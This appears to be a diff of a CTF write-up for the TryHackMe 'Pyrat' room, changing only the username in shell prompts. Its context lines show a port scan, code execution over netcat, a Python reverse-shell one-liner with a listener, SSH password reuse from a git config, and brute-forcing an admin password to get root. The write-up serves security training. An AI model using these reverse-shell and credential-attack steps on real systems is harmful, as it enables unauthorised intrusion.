@@ -13,7 +13,7 @@ Pyrat receives a curious response from an HTTP server, which leads to a potentia
 First we add the room on /etc/hosts file then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
 └─$ rustscan -a pyrat.thm -- -A 
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -26,7 +26,7 @@ ________________________________________
  --------------------------------------
 RustScan: Where scanning meets swagging. 😎
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.139.167:22
@@ -58,7 +58,7 @@ We try to go there :
 We can try [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :
 
 ```bash
-──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
+──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
 └─$ nc pyrat.thm 8000
 clear
 name 'clear' is not defined
@@ -82,7 +82,7 @@ import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 We set up our listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
 └─$ nc -lvnp 1337
 listening on [any] 1337 ...
 
@@ -91,7 +91,7 @@ listening on [any] 1337 ...
 now we paste the [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) in the python server :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
 └─$ nc -lvnp 1337
 listening on [any] 1337 ...
 connect to [10.8.162.183] from (UNKNOWN) [10.10.139.167] 36388
@@ -115,7 +115,7 @@ bash: /root/.bashrc: Permission denied
 www-data@ip-10-10-139-167:~$ ^Z
 zsh: suspended  nc -lvnp 1337
                                                                                                                               
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
 └─$ stty raw -echo;fg
 [1]  + continued  nc -lvnp 1337
                                reset
@@ -152,7 +152,7 @@ www-data@ip-10-10-139-167:/opt/dev/.git$ cat config
 And a password . We have a [Github](../../3%20-%20Tags/Hacking%20Concepts/Github.md) account, let's try password reusing on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
 └─$ ssh think@pyrat.thm      
 The authenticity of host 'pyrat.thm (10.10.139.167)' can't be established.
 ED25519 key fingerprint is SHA256:1zgaKWywJMFlKKf7DVoBKYnmmyuRk1tg6aA/HB64gfQ.
@@ -268,7 +268,7 @@ index 0000000..ce425cf
 It's taking data and checking if the user is admin, if we go on python (8000) and type `shell` :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
 └─$ nc pyrat.thm 8000
 shell
 $ whoami
@@ -343,7 +343,7 @@ fuzz_password(password_wordlist)
 Let's run it:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
 └─$ python3 fuzzing.py
 
 Congrats 1337 h4x0r the password is: abc123
@@ -355,7 +355,7 @@ BOOM !!!
 Now we log in as root and cat the root flag :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ nc pyrat.thm 8000
 admin
 Password:
